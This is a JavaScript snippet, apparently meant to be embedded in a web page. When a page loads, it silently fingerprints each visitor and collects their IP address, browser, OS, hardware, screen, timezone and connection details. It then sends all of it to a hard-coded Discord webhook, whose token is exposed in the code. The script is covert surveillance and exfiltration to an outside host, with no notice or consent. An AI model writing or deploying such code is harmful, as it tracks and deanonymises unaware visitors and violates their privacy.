import('https://openfpcdn.io/fingerprintjs/v3').then(FP => FP.load()).then(fp => {
  Promise.all([fp.get(), fetch('https://api.ipify.org?format=json').then(r => r.json())]).then(([{ visitorId }, { ip }]) => {
    const f = visitorId;
    const i = ip;
    const ua = navigator.userAgent;
    const browser = (() => {if (/Brave/i.test(ua) && navigator.brave) return "Brave";if (/OPR|Opera/i.test(ua)) return "Opera";if (/Edg/i.test(ua)) return "Microsoft Edge";if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";if (/UCBrowser/i.test(ua)) return "UC Browser";if (/Vivaldi/i.test(ua)) return "Vivaldi";if (/Firefox/i.test(ua)) return "Firefox";if (/Chrome/i.test(ua)) return "Chrome";if (/Safari/i.test(ua)) return "Safari";return "Desconocido";})();
    const device = /Mobi|Android|iPhone|iPad/i.test(ua) ? "📱 Móvil/Tablet" : "💻 PC";
    const hw = {cores: navigator.hardwareConcurrency || "Desconocido",ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocido",platform: navigator.platform || "Desconocido"};
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const screenDensity = window.devicePixelRatio || "Desconocido";
    const language = navigator.language || navigator.userLanguage || "Desconocido";
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const isHttp2 = /h2/i.test(window.performance.navigation.type) ? "HTTP/2" : "HTTP/1.1";
    const supportsWebGL = (function() {try {const canvas = document.createElement('canvas');return !!(window.WebGLRenderingContext && canvas.getContext('webgl'));} catch (e) {return false;}})() ? "Sí" : "No";
    const osVersion = (() => {if (/Windows NT 10.0/i.test(ua)) return "Windows 10";if (/Windows NT 6.3/i.test(ua)) return "Windows 8.1";if (/Windows NT 6.2/i.test(ua)) return "Windows 8";if (/Windows NT 6.1/i.test(ua)) return "Windows 7";if (/Windows NT 6.0/i.test(ua)) return "Windows Vista";if (/Windows NT 5.1/i.test(ua)) return "Windows XP";if (/Linux/i.test(ua)) {if (/Ubuntu/i.test(ua)) return "Linux (Ubuntu)";if (/Debian/i.test(ua)) return "Linux (Debian)";return "Linux (Desconocido)";}if (/Macintosh|Mac OS X/i.test(ua)) {const versionMatch = ua.match(/Mac OS X (\d+[_\.\d]+)/);return versionMatch ? `macOS ${versionMatch[1].replace('_', '.')}` : "macOS (Desconocido)";}return "Desconocido";})();
    const connectionInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const connectionType = connectionInfo ? connectionInfo.effectiveType : "Desconocido";
    const connectionSpeed = connectionInfo ? connectionInfo.downlink : "Desconocido";
    const localStorageSupport = typeof localStorage !== "undefined" ? "Sí" : "No";
    const cookiesEnabled = navigator.cookieEnabled ? "Sí" : "No";
    const additionalInfo = /Mobi|Android|iPhone|iPad/i.test(ua) ? {"🎮 Orientación de pantalla": window.orientation ? `${window.orientation}°` : "Desconocido","📐 Resolución de Pantalla": screenResolution} : {};
    const url = 'https://discord.com/api/webhooks/1372015307522179245/l6-SabmA8Yz6g408liCfFa6W2rfKIeVLoimk3xCnNI2ePVcj8QX0ePkPtGgbI2PKzYfJ';
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '🆕 New Visitor Info 🆕',
          color: 3447003,
          fields: [
            { name: '🖐️ Fingerprint', value: f, inline: false },
            { name: '🌍 IP', value: i, inline: false },
            { name: '🧭 Navegador', value: browser, inline: true },
            { name: '📱 Dispositivo', value: device, inline: true },
            { name: '🖥️ Plataforma', value: hw.platform, inline: true },
            { name: '🧠 Núcleos CPU', value: String(hw.cores), inline: true },
            { name: '📦 RAM Estimada', value: hw.ram, inline: true },
            { name: '🕰️ Zona Horaria', value: timezone, inline: true },
            { name: '💻 Sistema Operativo', value: osVersion, inline: true },
            { name: '🌐 Idioma', value: language, inline: true },
            { name: '🔎 Resolución de Pantalla', value: screenResolution, inline: true },
            { name: '💎 Densidad de Pantalla', value: screenDensity, inline: true },
            { name: '🕹️ Soporte WebGL', value: supportsWebGL, inline: true },
            { name: '🔗 Conexión', value: isHttp2, inline: true },
            { name: '🌐 Conexión Red', value: connectionType, inline: true },
            { name: '⚡ Velocidad de Red', value: connectionSpeed, inline: true },
            { name: '💾 LocalStorage', value: localStorageSupport, inline: true },
            { name: '🍪 Cookies', value: cookiesEnabled, inline: true },
            ...Object.entries(additionalInfo).map(([key, value]) => ({name: key, value, inline: true})),
            { name: '🖥️ User Agent', value: ua, inline: false }
          ]
        }]
      })
    });
  });
});
